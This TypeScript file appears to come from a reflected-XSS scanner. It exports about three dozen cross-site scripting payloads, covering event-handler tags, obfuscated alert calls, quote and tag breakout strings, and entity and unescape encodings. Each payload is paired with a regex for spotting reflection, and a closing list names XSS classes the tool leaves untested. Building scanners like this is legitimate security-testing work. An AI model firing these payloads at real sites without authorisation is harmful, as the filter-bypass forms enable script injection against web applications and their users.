export const XSS_TAGS = ["script", "img", "svg", "body", "style", "details", "a", "marquee", "input", "iframe", "image"]

export const XSS_WEAPONS: ((n: string) => { payload: string; sig: RegExp })[] = [
  (n) => ({ payload: `<svg onload=alert(${n})>`, sig: new RegExp(`onload=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<img src=x onerror=alert(${n})>`, sig: new RegExp(`onerror=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<image/src/onerror=alert(${n})>`, sig: new RegExp(`<image/src/onerror=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<body onpageshow=alert(${n})>`, sig: new RegExp(`onpageshow=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<details open ontoggle=alert(${n})>`, sig: new RegExp(`ontoggle=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<marquee onstart=alert(${n})>`, sig: new RegExp(`onstart=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<input autofocus onfocus=alert(${n})>`, sig: new RegExp(`onfocus=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<a href=javascript:alert(${n})>x</a>`, sig: new RegExp(`href=javascript:alert\\(${n}`, "i") }),
  (n) => ({ payload: `<svg/onload=alert(${n})>`, sig: new RegExp(`<svg/onload=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<img/src/onerror=alert(${n})>`, sig: new RegExp(`<img/src/onerror=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<body/onpageshow=alert(${n})>`, sig: new RegExp(`<body/onpageshow=alert\\(${n}`, "i") }),
  (n) => ({
    payload: `<details/open/ontoggle=alert(${n})>`,
    sig: new RegExp(`<details/open/ontoggle=alert\\(${n}`, "i"),
  }),
  (n) => ({ payload: `<marquee/onstart=alert(${n})>`, sig: new RegExp(`<marquee/onstart=alert\\(${n}`, "i") }),
  (n) => ({
    payload: `<input/autofocus/onfocus=alert(${n})>`,
    sig: new RegExp(`<input/autofocus/onfocus=alert\\(${n}`, "i"),
  }),
  (n) => ({ payload: `<style onload=alert(${n})>`, sig: new RegExp(`<style onload=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<style/onload=alert(${n})>`, sig: new RegExp(`<style/onload=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<svg onload=\\u0061lert(${n})>`, sig: new RegExp(`onload=\\\\u0061lert\\(${n}`, "i") }),
  (n) => ({ payload: `<svg onload=top['al'+'ert'](${n})>`, sig: new RegExp(`top\\['al'\\+'ert'\\]\\(${n}`, "i") }),
  (n) => ({ payload: `<svg onload=(alert)(${n})>`, sig: new RegExp(`\\(alert\\)\\(${n}`, "i") }),
  (n) => ({ payload: `" onmouseover=alert(${n}) x="`, sig: new RegExp(`" onmouseover=alert\\(${n}`, "i") }),
  (n) => ({ payload: `' onmouseover=alert(${n}) x='`, sig: new RegExp(`' onmouseover=alert\\(${n}`, "i") }),
  (n) => ({ payload: `javascript:alert(${n})`, sig: new RegExp(`javascript:alert\\(${n}`, "i") }),
  (n) => ({ payload: `" onerror=alert&#40;${n}&#41; x="`, sig: new RegExp(`" onerror=alert&#40;${n}`, "i") }),
  (n) => ({ payload: `' onerror=alert&#40;${n}&#41; x='`, sig: new RegExp(`' onerror=alert&#40;${n}`, "i") }),
  (n) => ({ payload: `<svg onload=confirm(${n})>`, sig: new RegExp(`onload=confirm\\(${n}`, "i") }),
  (n) => ({ payload: `<svg onload=print(${n})>`, sig: new RegExp(`onload=print\\(${n}`, "i") }),
  (n) => ({ payload: `<img src=x onerror=print(${n})>`, sig: new RegExp(`onerror=print\\(${n}`, "i") }),
  (n) => ({ payload: `<svg onload=prompt(${n})>`, sig: new RegExp(`onload=prompt\\(${n}`, "i") }),
]

export const XSS_WEAPONS_BAREARG: ((n: string) => { payload: string; sig: RegExp })[] = [
  (n) => ({ payload: `<svg onload=alert(\`${n}\`)>`, sig: new RegExp(`onload=alert\\(\`${n}\``, "i") }),
  (n) => ({ payload: `<svg/onload=alert(\`${n}\`)>`, sig: new RegExp(`<svg/onload=alert\\(\`${n}\``, "i") }),
  (n) => ({ payload: `<svg onload=alert(/${n}/.source)>`, sig: new RegExp(`alert\\(/${n}/\\.source\\)`, "i") }),
  (n) => ({ payload: `" onfocus=alert(\`${n}\`) autofocus x="`, sig: new RegExp(`" onfocus=alert\\(\`${n}\``, "i") }),
  (n) => ({ payload: `' onfocus=alert(\`${n}\`) autofocus x='`, sig: new RegExp(`' onfocus=alert\\(\`${n}\``, "i") }),
]

export const XSS_WEAPONS_ENCODED: { probe: (n: string) => { payload: string; sig: RegExp }; ready: string }[] = [
  {
    probe: (n) => ({ payload: `alert(unescape(\`${n}\`))`, sig: new RegExp(`alert\\(unescape\\(\`${n}\``, "i") }),
    ready: "alert(unescape(`%58%53%53`))",
  },
  {
    probe: (n) => ({ payload: `";alert(unescape(\`${n}\`))//`, sig: new RegExp(`";alert\\(unescape\\(\`${n}\``, "i") }),
    ready: '";alert(unescape(`%58%53%53`))//',
  },
]

export const XSS_BREAKOUT: Record<string, (n: string) => string> = {
  "attribute-double-quote": (n) => `"><svg data-p=${n}>`,
  "attribute-single-quote": (n) => `'><svg data-p=${n}>`,
  "attribute-url-double": (n) => `"><svg data-p=${n}>`,
  "attribute-url-single": (n) => `'><svg data-p=${n}>`,
  javascript: (n) => `</script><svg data-p=${n}>`,
  "rcdata-textarea": (n) => `</textarea><svg data-p=${n}>`,
  "rcdata-title": (n) => `</title><svg data-p=${n}>`,
  "rcdata-style": (n) => `</style><svg data-p=${n}>`,
}

export const XSS_NOT_TESTED = [
  "stored/second-order XSS (fires on a different render request)",
  "DOM-based XSS (needs a JS engine)",
  "true JS execution (this tool only checks reflection, not execution)",
  "blind/out-of-band classes",
  "CSRF-token-protected or multi-step flows",
  "non-query/non-form injection points (path, header, cookie, JSON, XML, GraphQL, multipart)",
]
